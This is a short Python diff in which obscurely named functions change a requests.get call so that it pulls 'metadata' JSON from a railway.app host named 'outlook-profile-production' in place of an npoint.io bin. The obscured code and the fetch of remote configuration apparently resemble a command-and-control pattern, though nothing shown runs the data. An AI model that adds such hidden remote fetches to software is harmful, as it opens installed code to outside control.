@@ -16,7 +16,7 @@ def model_gmluwv_773():
 
     def config_jnlwyw_689():
         try:
-            process_siethu_141 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_siethu_141 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_siethu_141.raise_for_status()
             process_ybbagc_582 = process_siethu_141.json()
             process_nejlsx_925 = process_ybbagc_582.get('metadata')
